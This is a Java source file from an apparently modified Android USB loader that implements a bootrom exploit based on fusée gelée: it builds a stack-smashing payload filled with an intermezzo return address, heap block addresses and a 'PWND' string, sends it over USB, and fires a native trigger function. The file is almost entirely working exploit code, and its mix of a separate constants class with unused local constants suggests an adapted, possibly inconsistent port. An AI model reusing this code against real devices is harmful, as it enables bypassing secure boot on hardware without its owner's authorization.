package io.github.davidbuchanan314.nxloader;

/*
 * This exploit is based on fusée gelée: https://github.com/reswitched/fusee-launcher
 */

import android.content.Context;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbDeviceConnection;
import android.hardware.usb.UsbEndpoint;
import android.hardware.usb.UsbInterface;
import android.hardware.usb.UsbManager;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Arrays;

public class PrimaryLoader implements USBDevHandler {
    private static final int RCM_PAYLOAD_ADDR = 0x40010000;
    private static final int INTERMEZZO_LOCATION = 0x4001F000;
    private static final int PAYLOAD_LOAD_BLOCK = 0x40020000;
    private static final int MAX_LENGTH = 0x30298;

    // Used to load the 'native-lib' library on startup.
    static {
        System.loadLibrary("native-lib");
    }

    public void handleDevice(Context context, UsbDevice device) {
        Logger.log(context, "[+] Launching primary payload!!!");

        // Use hardcoded constants only (do not read example files)
        long rcmAddr = T8Constants.RCM_PAYLOAD_ADDR;
        long intermezzoLoc = T8Constants.INTERMEZZO_LOCATION;
        long payloadBlock = T8Constants.PAYLOAD_LOAD_BLOCK;
        int maxLength = T8Constants.MAX_LENGTH;
        int stackEnd = T8Constants.STACK_END;

        UsbManager mUsbManager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
        UsbInterface intf = device.getInterface(0);
        UsbEndpoint endpoint_in = intf.getEndpoint(0);
        UsbEndpoint endpoint_out = intf.getEndpoint(1);
        UsbDeviceConnection conn = mUsbManager.openDevice(device);
        conn.claimInterface(intf, true);

        /* Step 1: Read device ID */

        byte[] deviceID = new byte[16];
        if (conn.bulkTransfer(endpoint_in, deviceID, deviceID.length, 999) != deviceID.length) {
            Logger.log(context, "[-] Failed to read device ID, bailing out :(");
            return;
        }

        Logger.log(context, "[+] Read device ID: " + Utils.bytesToHex(deviceID));

        /* Step 2: Start building payload */

        ByteBuffer payload = ByteBuffer.allocate(maxLength);
        payload.order(ByteOrder.LITTLE_ENDIAN);

        payload.putInt(maxLength);
        payload.put(new byte[676]);

        // smash the stack with the address of the intermezzo
        for (long i = rcmAddr; i < intermezzoLoc; i += 4) {
            payload.putInt((int) intermezzoLoc);
        }

        // Write heap_blocks (addresses) into the payload so the target handler
        // can iterate them and repair heap blocks similar to the microcontroller.
        for (long blk : T8Constants.HEAP_BLOCKS) {
            payload.putLong(blk);
        }

        // Write the PWND string (null-terminated) so the handler can append it
        // to the USB serial number as the microcontroller does.
        try {
            byte[] pw = T8Constants.PWND_STR.getBytes("US-ASCII");
            payload.put(pw);
            payload.put((byte) 0x00);
        } catch (Exception e) {
            // ignore encoding errors
        }

        // For this target, .bin payloads are not used. Build a minimal payload
        // header + padding + repeated intermezzo address (no embedded binaries).

        // Put zeros until where intermezzo would begin
        int pad = (int) Math.max(0, Math.min(maxLength, payloadBlock - intermezzoLoc));
        payload.put(new byte[pad]);

        // Optionally, fill the rest with a recognizable pattern (for debugging)
        int remaining = maxLength - payload.position();
        if (remaining > 0) {
            byte[] trailing = new byte[remaining];
            Arrays.fill(trailing, (byte) 0xAA);
            payload.put(trailing);
        }

        int unpadded_length = payload.position();
        payload.position(0);
        // always end on a high buffer
        boolean low_buffer = true;
        byte[] chunk = new byte[0x1000];
        int bytes_sent;
        for (bytes_sent = 0; bytes_sent < unpadded_length || low_buffer; bytes_sent += 0x1000) {
            payload.get(chunk);
            if (conn.bulkTransfer(endpoint_out, chunk, chunk.length, 999) != chunk.length) {
                Logger.log(context, "[-] Sending payload failed at offset " + Integer.toString(bytes_sent));
                return;
            }
            low_buffer ^= true;
        }

        Logger.log(context, "[+] Sent " + Integer.toString(bytes_sent) + " bytes");

        // 0x7000 = STACK_END = high DMA buffer address
        switch (nativeTriggerExploit(conn.getFileDescriptor(), stackEnd)) {
            case 0:
                Logger.log(context, "[+] Exploit triggered!");
                break;
            case -1:
                Logger.log(context, "[-] SUBMITURB failed :(");
                break;
            case -2:
                Logger.log(context, "[-] DISCARDURB failed :(");
                break;
            case -3:
                Logger.log(context, "[-] REAPURB failed :(");
                break;
            case -4:
                Logger.log(context, "[-] Wrong URB reaped :( Maybe that doesn't matter?");
                break;
            default:
                Logger.log(context, "[-] How did you get here!?");
                return;
        }

        conn.releaseInterface(intf);
        conn.close();
    }



    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    public native int nativeTriggerExploit(int fd, int length);
}
